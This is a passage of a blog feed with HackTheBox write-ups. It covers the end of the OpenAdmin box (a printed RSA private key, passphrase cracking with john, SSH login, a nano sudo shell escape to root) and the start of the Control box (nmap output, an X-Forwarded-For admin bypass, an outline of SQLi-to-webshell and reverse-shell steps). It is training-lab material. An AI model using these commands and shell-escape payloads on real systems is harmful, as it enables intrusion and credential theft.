class="line">ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du</span><br><span class="line">y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI</span><br><span class="line">9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4</span><br><span class="line">piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/</span><br><span class="line">/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH</span><br><span class="line">40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ</span><br><span class="line">fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb</span><br><span class="line">9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80</span><br><span class="line">X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg</span><br><span class="line">S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F</span><br><span class="line">FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh</span><br><span class="line">Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa</span><br><span class="line">RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z</span><br><span class="line">uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr</span><br><span class="line">1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2</span><br><span class="line">XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79</span><br><span class="line">yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM</span><br><span class="line">+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt</span><br><span class="line">qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt</span><br><span class="line">z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe</span><br><span class="line">K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line">&lt;/pre&gt;&lt;html&gt;</span><br><span class="line">&lt;h3&gt;Don<span class="string">'t forget your "ninja" password&lt;/h3&gt;</span></span><br><span class="line"><span class="string">Click here to logout &lt;a href="logout.php" tite = "Logout"&gt;Session</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">jimmy@openadmin:/var/www/internal$</span></span><br></pre></td></tr></table></figure><p>I copy the <code>RSA Key</code> on my Kali then decrypt it with <code>ssh2john</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/OpenAdmin via üêò v7.3.15 via üêç v3.8.2 </span><br><span class="line">‚ùØ ./ssh2john.py id_rsa &gt; rsa.hash</span><br><span class="line">./ssh2john.py:103: DeprecationWarning: decodestring() is a deprecated <span class="built_in">alias</span> since Python 3.1, use decodebytes()</span><br><span class="line">  data = base64.decodestring(data)</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/OpenAdmin via üêò v7.3.15 via üêç v3.8.2 </span><br><span class="line">‚ùØ ls</span><br><span class="line">exploit.sh  file-write  id_rsa  LinEnum.sh  nmap-OpenAdmin  rsa.hash  shell.php  ssh2john.py</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/OpenAdmin via üêò v7.3.15 via üêç v3.8.2 </span><br><span class="line">‚ùØ cat rsa.hash </span><br><span class="line">id_rsa:<span class="variable">$sshng</span><span class="variable">$1</span><span class="variable">$16</span><span class="variable">$2AF25344B8391A25A9B318F3FD767D6D</span><span class="variable">$1200</span><span class="variable">$906d14608706c9ac6ea6342a692d9ed47a9b87044b94d72d5b61df25e68a5235991f8bac883f40b539c829550ea5937c69dfd2b4c589f8c910e4c9c030982541e51b4717013fafbe1e1db9d6331c83cca061cc7550c0f4dd98da46ec1c7f460e4a135b6f1f04bafaf66a08db17ecad8a60f25a1a095d4f94a530f9f0bf9222c6736a5f54f1ff93c6182af4ad8a407044eb16ae6cd2a10c92acffa6095441ed63215b6126ed62de25b2803233cc3ea533d56b72d15a71b291547983bf5bee5b0966710f2b4edf264f0909d6f4c0f9cb372f4bb323715d17d5ded5f83117233976199c6d86bfc28421e217ccd883e7f0eecbc6f227fdc8dff12ca87a61207803dd47ef1f2f6769773f9cb52ea7bb34f96019e00531fcc267255da737ca3af49c88f73ed5f44e2afda28287fc6926660b8fb0267557780e53b407255dcb44899115c568089254d40963c8511f3492efe938a620bde879c953e67cfb55dbbf347ddd677792544c3bb11eb0843928a34d53c3e94fed25bff744544a69bc80c4ffc87ffd4d5c3ef5fd01c8b4114cacde7681ea9556f22fc863d07a0f1e96e099e749416cca147add636eb24f5082f9224e2907e3464d71ae711cf8a3f21bd4476bf98c633ff1bbebffb42d24544298c918a7b14c501d2c43534b8428d34d500537f0197e75a4279bbe4e8d2acee3c1586a59b28671e406c0e178b4d29aaa7a478b0258bde6628a3de723520a66fb0b31f1ea5bf45b693f868d47c2d89692920e2898ccd89710c42227d31293d9dad740791453ec8ebfb26047ccca53e0a200e9112f345f5559f8ded2f193feedd8c1db6bd0fbfa5441aa773dd5c4a60defe92e1b7d79182af16472872ab3c222bdd2b5f941604b7de582b08ce3f6635d83f66e9b84e6fe9d3eafa166f9e62a4cdc993d42ed8c0ad5713205a9fc7e5bc87b2feeaffe05167a27b04975e9366fa254adf511ffd7d07bc1f5075d70b2a7db06f2224692566fb5e8890c6e39038787873f21c52ce14e1e70e60b8fca716feb5d0727ac1c355cf633226c993ca2f16b95c59b3cc31ac7f641335d80ff1ad3e672f88609ec5a4532986e0567e169094189dcc82d11d46bf73bc6c48a05f84982aa222b4c0e78b18cceb15345116e74f5fbc55d407ed9ba12559f57f37512998565a54fe77ea2a2224abbddea75a1b6da09ae3ac043b6161809b630174603f33195827d14d0ebd64c6e48e0d0346b469d664f89e2ef0e4c28b6a64acdd3a0edf8a61915a246feb25e8e69b3710916e494d5f482bf6ab65c675f73c39b2c2eecdca6709188c6f36b6331953e3f93e27c987a3743eaa71502c43a807d8f91cdc4dc33f48b852efdc8fcc2647f2e588ae368d69998348f0bfcfe6d65892aebb86351825c2aa45afc2e6869987849d70cec46ba951c864accfb8476d5643e7926942ddd8f0f32c296662ba659e999b0fb0bbfde7ba2834e5ec931d576e4333d6b5e8960e9de46d32daa5360ce3d0d6b864d3324401c4975485f1aef6ba618edb12d679b0e861fe5549249962d08d25dc2dde517b23cf9a76dcf482530c9a34762f97361dd95352de4c82263cfaa90796c2fa33dd5ce1d889a045d587ef18a5b940a2880e1c706541e2b523572a8836d513f6e688444af86e2ba9ad2ded540deadd9559eb56ac66fe021c3f88c2a1a484d62d602903793d10d</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/OpenAdmin via üêò v7.3.15 via üêç v3.8.2 </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><p>after getting the hash now it‚Äôs time cracked it with <code>john</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/OpenAdmin via üêò v7.3.15 via üêç v3.8.2 </span><br><span class="line">‚ùØ john --wordlist=/usr/share/wordlists/rockyou.txt rsa.hash </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span><br><span class="line">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 1 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Note: This format may emit <span class="literal">false</span> positives, so it will keep trying even after</span><br><span class="line">finding a possible candidate.</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">bloodninjas      (id_rsa)</span><br><span class="line">1g 0:00:00:12 92.93% (ETA: 05:02:34) 0.08319g/s 1114Kp/s 1114Kc/s 1114KC/s 11235813211618..11235655</span><br><span class="line">Warning: Only 2 candidates left, minimum 4 needed <span class="keyword">for</span> performance.</span><br><span class="line">1g 0:00:00:13 DONE (2020-05-04 05:02) 0.07358g/s 1055Kp/s 1055Kc/s 1055KC/sa6_123..*7¬°Vamos!</span><br><span class="line">Session completed</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/OpenAdmin via üêò v7.3.15 via üêç v3.8.2 took 18s </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><p>then finally i can login as user <code>joanna</code> with passphrase <code>bloodninjas</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/OpenAdmin via üêò v7.3.15 via üêç v3.8.2 </span><br><span class="line">‚ùØ ssh -v -i id_rsa joanna@10.10.10.171</span><br><span class="line">OpenSSH_8.2p1 Debian-4, OpenSSL 1.1.1g  21 Apr 2020</span><br><span class="line">debug1: Reading configuration data /etc/ssh/ssh_config</span><br><span class="line">debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files</span><br><span class="line">debug1: /etc/ssh/ssh_config line 21: Applying options <span class="keyword">for</span> *</span><br><span class="line">debug1: Connecting to 10.10.10.171 [10.10.10.171] port 22.</span><br><span class="line">debug1: Connection established.</span><br><span class="line">debug1: identity file id_rsa <span class="built_in">type</span> -1</span><br><span class="line">debug1: identity file id_rsa-cert <span class="built_in">type</span> -1</span><br><span class="line">debug1: Local version string SSH-2.0-OpenSSH_8.2p1 Debian-4</span><br><span class="line">debug1: Remote protocol version 2.0, remote software version OpenSSH_7.6p1 Ubuntu-4ubuntu0.3</span><br><span class="line">debug1: match: OpenSSH_7.6p1 Ubuntu-4ubuntu0.3 pat OpenSSH_7.0*,OpenSSH_7.1*,OpenSSH_7.2*,OpenSSH_7.3*,OpenSSH_7.4*,OpenSSH_7.5*,OpenSSH_7.6*,OpenSSH_7.7* compat 0x04000002</span><br><span class="line">debug1: Authenticating to 10.10.10.171:22 as <span class="string">'joanna'</span></span><br><span class="line">debug1: SSH2_MSG_KEXINIT sent</span><br><span class="line">debug1: SSH2_MSG_KEXINIT received</span><br><span class="line">debug1: kex: algorithm: curve25519-sha256</span><br><span class="line">debug1: kex: host key algorithm: ecdsa-sha2-nistp256</span><br><span class="line">debug1: kex: server-&gt;client cipher: chacha20-poly1305@openssh.com MAC: &lt;implicit&gt; compression: none</span><br><span class="line">debug1: kex: client-&gt;server cipher: chacha20-poly1305@openssh.com MAC: &lt;implicit&gt; compression: none</span><br><span class="line">debug1: expecting SSH2_MSG_KEX_ECDH_REPLY</span><br><span class="line">debug1: Server host key: ecdsa-sha2-nistp256 SHA256:loIRDdkV6Zb9r8OMF3jSDMW3MnV5lHgn4wIRq+vmBJY</span><br><span class="line">The authenticity of host <span class="string">'10.10.10.171 (10.10.10.171)'</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:loIRDdkV6Zb9r8OMF3jSDMW3MnV5lHgn4wIRq+vmBJY.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added '</span>10.10.10.171<span class="string">' (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">debug1: rekey out after 134217728 blocks</span></span><br><span class="line"><span class="string">debug1: SSH2_MSG_NEWKEYS sent</span></span><br><span class="line"><span class="string">debug1: expecting SSH2_MSG_NEWKEYS</span></span><br><span class="line"><span class="string">debug1: SSH2_MSG_NEWKEYS received</span></span><br><span class="line"><span class="string">debug1: rekey in after 134217728 blocks</span></span><br><span class="line"><span class="string">debug1: Will attempt key: id_rsa  explicit</span></span><br><span class="line"><span class="string">debug1: SSH2_MSG_EXT_INFO received</span></span><br><span class="line"><span class="string">debug1: kex_input_ext_info: server-sig-algs=&lt;ssh-ed25519,ssh-rsa,rsa-sha2-256,rsa-sha2-512,ssh-dss,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521&gt;</span></span><br><span class="line"><span class="string">debug1: SSH2_MSG_SERVICE_ACCEPT received</span></span><br><span class="line"><span class="string">debug1: Authentications that can continue: publickey,password</span></span><br><span class="line"><span class="string">debug1: Next authentication method: publickey</span></span><br><span class="line"><span class="string">debug1: Trying private key: id_rsa</span></span><br><span class="line"><span class="string">Enter passphrase for key '</span>id_rsa<span class="string">': </span></span><br><span class="line"><span class="string">Enter passphrase for key '</span>id_rsa<span class="string">': </span></span><br><span class="line"><span class="string">debug1: Authentication succeeded (publickey).</span></span><br><span class="line"><span class="string">Authenticated to 10.10.10.171 ([10.10.10.171]:22).</span></span><br><span class="line"><span class="string">debug1: channel 0: new [client-session]</span></span><br><span class="line"><span class="string">debug1: Requesting no-more-sessions@openssh.com</span></span><br><span class="line"><span class="string">debug1: Entering interactive session.</span></span><br><span class="line"><span class="string">debug1: pledge: network</span></span><br><span class="line"><span class="string">debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0</span></span><br><span class="line"><span class="string">debug1: Sending environment.</span></span><br><span class="line"><span class="string">debug1: Sending env LANG = en_US.utf8</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System information as of Sun May  3 21:27:30 UTC 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load:  0.0               Processes:             115</span></span><br><span class="line"><span class="string">  Usage of /:   49.3% of 7.81GB   Users logged in:       0</span></span><br><span class="line"><span class="string">  Memory usage: 18%               IP address for ens160: 10.10.10.171</span></span><br><span class="line"><span class="string">  Swap usage:   0%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Canonical Livepatch is available for installation.</span></span><br><span class="line"><span class="string">   - Reduce system reboots and improve kernel security. Activate at:</span></span><br><span class="line"><span class="string">     https://ubuntu.com/livepatch</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">41 packages can be updated.</span></span><br><span class="line"><span class="string">12 updates are security updates.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Thu Jan  2 21:12:40 2020 from 10.10.14.3</span></span><br><span class="line"><span class="string">joanna@openadmin:~$</span></span><br></pre></td></tr></table></figure><p>and get the <code>user.txt</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">joanna@openadmin:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">joanna@openadmin:~$ wc -c user.txt</span><br><span class="line">33 user.txt</span><br><span class="line">33 total</span><br><span class="line">joanna@openadmin:~$ cut -c 1-12 user.txt</span><br><span class="line">c9b2cf07d408</span><br><span class="line">joanna@openadmin:~$</span><br></pre></td></tr></table></figure><h3 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase 2"></a>Phase 2</h3><p>Going to <code>root</code> is very straight forward running <code>sudo -l</code> we can see that the user <code>Joanna</code> can run as the root user <code>/bin/nano /opt/priv</code> without entering a password.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">joanna@openadmin:/$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> joanna on openadmin:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User joanna may run the following commands on openadmin:</span><br><span class="line">    (ALL) NOPASSWD: /bin/nano /opt/priv</span><br><span class="line"></span><br><span class="line">joanna@openadmin:/$</span><br></pre></td></tr></table></figure><p>base on <code>#GTFObins</code> It can be used to break out from restricted environments by spawning an interactive system shell. just run <code>nano</code> then <code>ctrl+R</code>-&gt; <code>ctrl+X</code> then execute a command <code>reset; sh 1&gt;&amp;0 2&gt;&amp;0</code> then u have finally a shell.</p><p><img src="/img/openA/openA-nano.PNG" alt="HackTheBox-OpenAdmin" title="Root Nano"></p><p>so it‚Äôs time to do exploitation</p><p><img src="/img/openA/openA-root.png" alt="HackTheBox-OpenAdmin" title="Root Nano"></p><p>after executing finally I got the administrator shell <code>root</code> and get the <code>user.txt</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>get proper shell as <code>root</code> :</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># /bin/bash -i</span></span><br><span class="line">root@openadmin:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@openadmin:~<span class="comment"># cd /root</span></span><br><span class="line">root@openadmin:/root<span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">root@openadmin:/root<span class="comment"># wc -c root.txt</span></span><br><span class="line">33 root.txt</span><br><span class="line">root@openadmin:/root<span class="comment"># cut -c 1-12 root.txt</span></span><br><span class="line">2f907ed450b3</span><br><span class="line">root@openadmin:/root<span class="comment">#</span></span><br></pre></td></tr></table></figure><hr><p>If you liked my writeup please leave a respect on my <a href="https://www.hackthebox.eu/profile/128965" target="_blank" rel="noopener">Profile</a></p><p><img src="https://www.hackthebox.eu/badge/image/128965" alt="Payas0" title="Payas0"></p><hr><p>Referrences:</p><p><a href="https://www.exploit-db.com/exploits/47691" target="_blank" rel="noopener">OpenNetAdmin RCE at v18.1.1 Exploit</a></p><p><a href="https://gtfobins.github.io/gtfobins/nano/" target="_blank" rel="noopener">GTFObins - Nano</a></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
          <category> PenTesting </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenNetAdmin </tag>
            
            <tag> rce </tag>
            
            <tag> GTFObins </tag>
            
            <tag> linux </tag>
            
            <tag> mysql </tag>
            
            <tag> retired </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Control</title>
      <link href="/2020-04-26/HackTheBox-Control/"/>
      <url>/2020-04-26/HackTheBox-Control/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/control/control-1.png" alt="HackTheBox-Control" title="Control machine details"></p><hr><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>   ‚Üí This is really hard but a fan box machine. It has a vulnerable <code>PHP</code> webapplication that you can access the admin panel by putting <code>X-Forwarded-For</code> in <code>HTTP Header</code> using <strong><a href="https://portswigger.net/burp" target="_blank" rel="noopener">BurpSuite</a></strong> then I can get the admin panel.<br>   The products panel in admin page is vulnerable to <strong>SQLi</strong> which can to lead to <strong>RCE</strong> or <strong>Remote Code Execution</strong>. Using <code>SQLMap</code> i get some password hash for user <code>Hector</code> and manage to inject a <code>webshell</code> which is the <strong><a href="https://github.com/WhiteWinterWolf/wwwolf-php-webshell" target="_blank" rel="noopener">Winter Webshell</a></strong> and upload my <code>nc.exe</code> to gain reverse shell from my <strong>Kali Linux machine</strong>.<br>   The first privilege escalation was to get the user, I decrypt first the password hash of <code>Hector</code> then I used <code>portforwarding</code> then <code>evil-winrm</code> to get in and get the <code>user.txt</code>. The root part is really ! hard I‚Äôm looking deep at Windows objects and permissions. I‚Äôll find out that users can write the registry keys associated with Services but then I discover that user <code>Hector</code> had <em>FullControl</em> in several <em>Services</em> so I abuse the path with administrators privileges and execute my <code>nc.exe</code>. I setup a <code>netcat</code> listener first from my <strong>Kali Linux</strong> ‚Üí start the service and finally got the <code>administrator</code> and <code>root.txt</code></p><hr><h2 id="Penetration-Testing-Methodologies"><a href="#Penetration-Testing-Methodologies" class="headerlink" title="Penetration Testing Methodologies"></a>Penetration Testing Methodologies</h2><ol><li><p><strong>Network Scanning</strong></p><p>‚Üí Nmap scan</p><p>‚Üí discover open ports and what services are running</p></li><li><p><strong>Enumeration</strong></p><p>‚Üí Browsing the HTTP Service</p><p>‚Üí The <strong>ADMIN</strong> is missing out of header</p><p>‚Üí examine the web source code there was a <code>IP Address</code> that I can use for <code>X-Forwarded-For</code></p></li><li><p><strong>Post - Exploitation</strong></p><p>‚Üí Modify <code>HTTP Request</code> with <strong>BurpSuite</strong> to bypass admin panel</p><p>‚Üí The <code>search_products.php</code> was vulnerable to <code>SQLi</code></p><p>‚Üí use <code>SQLMap</code> to enumerate website vulnerability from there I can get user credentials</p></li><li><p><strong>Exploitation</strong></p><p>‚Üí inject <code>webshells</code> with <code>SQLMap - File write</code></p><p>‚Üí gain revere shell</p><p>‚Üí decrypt the password hash of <code>Hector</code></p><p>‚Üí using <code>portforwarding</code> with <code>plink.exe</code> method I can get in to user shell and get the <code>user.txt</code> </p></li><li><p><strong>Privilege Escalation</strong></p><p>‚Üí The only hint we have is the <strong><a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-lists" target="_blank" rel="noopener">ACL or Access Control List</a></strong></p><p>‚Üí Enumerate <strong>FullControl</strong> and <strong>Services</strong> for <code>Hector</code></p><p>‚Üí move <code>nc.exe</code> in the services and directory which have administrator privileges</p><p>‚Üí setup listener <code>netcat</code> from my Kali Linux</p><p>‚Üí start the services and Finally i have the administrator and <code>root.txt</code></p></li></ol><hr><h2 id="Network-Scanning"><a href="#Network-Scanning" class="headerlink" title="Network Scanning"></a>Network Scanning</h2><h3 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h3><p>‚Üí I always begin at <strong><em>NMAP</em></strong> to look on the services what is running. I always use</p><hr><ul><li>-sV      ‚áí Probe open ports to determine service/version info</li><li>-sC      ‚áí equivalent to ‚Äîscript=default</li><li>-A-      ‚áí Agressive scan</li><li>-oN      ‚áí to save our scan results to a text file</li></ul><hr><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">nmap -sV -sC -A -T4 10.10.10.167 -oN nmap-Control</span><br></pre></td></tr></table></figure><hr><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Control </span><br><span class="line">‚ùØ nmap -sV -sC -A 10.10.10.167 -oN nmap-Control</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-25 04:43 PST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.167</span><br><span class="line">Host is up (0.21s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-title: Fidelity</span><br><span class="line">135/tcp  open  msrpc   Microsoft Windows RPC</span><br><span class="line">3306/tcp open  mysql?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   LDAPSearchReq, WMSRequest, X11Probe: </span><br><span class="line">|_    Host <span class="string">'10.10.15.102'</span> is not allowed to connect to this MariaDB server</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port3306-TCP:V=7.80%I=7%D=4/25%Time=5EA34F9C%P=x86_64-pc-linux-gnu%r(X1</span><br><span class="line">SF:1Probe,4B,<span class="string">"G\0\0\x01\xffj\x04Host\x20'10\.10\.15\.102'\x20is\x20not\x20</span></span><br><span class="line"><span class="string">SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server"</span>)%r(LDAPSea</span><br><span class="line">SF:rchReq,4B,<span class="string">"G\0\0\x01\xffj\x04Host\x20'10\.10\.15\.102'\x20is\x20not\x20</span></span><br><span class="line"><span class="string">SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server"</span>)%r(WMSRequ</span><br><span class="line">SF:est,4B,<span class="string">"G\0\0\x01\xffj\x04Host\x20'10\.10\.15\.102'\x20is\x20not\x20all</span></span><br><span class="line"><span class="string">SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server"</span>);</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">OS fingerprint not ideal because: Missing a closed TCP port so results incomplete</span><br><span class="line">No OS matches <span class="keyword">for</span> host</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 3306/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   205.09 ms 10.10.14.1</span><br><span class="line">2   205.48 ms 10.10.10.167</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 57.73 seconds</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Control took 58s </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><hr><h3 id="Nmap-results"><a href="#Nmap-results" class="headerlink" title="Nmap results"></a>Nmap results</h3><p>So there‚Äôs port open.</p><ul><li>80       ‚áí which basically running a website</li><li>135       ‚áí which running Microsoft Windows RPC</li><li>3306       ‚áí running a mysql</li></ul><hr><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="CONTROL-Website"><a href="#CONTROL-Website" class="headerlink" title="CONTROL Website"></a>CONTROL Website</h3><p>Normally i explore first the website‚Äô because that will give us interesting stuffs so :</p><p><img src="/img/control/control-homepage.png" alt="HackTheBox-Control" title="Control machine details"></p><p>I tried to bruteforce the web directories‚Äô but it doesn‚Äôt help, but as you can see there‚Äôs a <code>admin</code> tab in the web page. I tried to click on that from there‚Äô it says <strong>Header is Missing</strong> this is very interesting, it looks like to access the admin.php page we need to simulate that we are using an<br>internal <code>IP Address</code> using some HTTP header :</p><p><img src="/img/control/control-admin-php.png" alt="HackTheBox-Control" title="Control Header Missing"></p><p>next I open the web source code of the site‚Äô well we have a big hint :</p><p><img src="/img/control/control-x-forwarding.png" alt="HackTheBox-Control" title="Control Header Missing"></p><p>based on the source code we can access <code>admin.php</code> with internal IP <code>192.168.4.28</code> from the help of some players in the forum we can use <code>X-Forwarded-For</code> options, I can achieve that with <strong>BurpSuite</strong></p><hr><h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post - Exploitation"></a>Post - Exploitation</h2><h3 id="X-Forwarded-For"><a href="#X-Forwarded-For" class="headerlink" title="X-Forwarded-For"></a>X-Forwarded-For</h3><p>I intercept the <code>admin.php</code> and input a <code>X-Forwarded-For: 192.168.4.28</code> and send it.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">GET /admin.php HTTP/1.1</span><br><span class="line">Host: 10.10.10.167</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://10.10.10.167/</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">X-Forwarded-For: 192.168.4.28</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure><p>after that we get a <code>200 OK Status</code></p><figure class="highlight sh"><table><tr><td 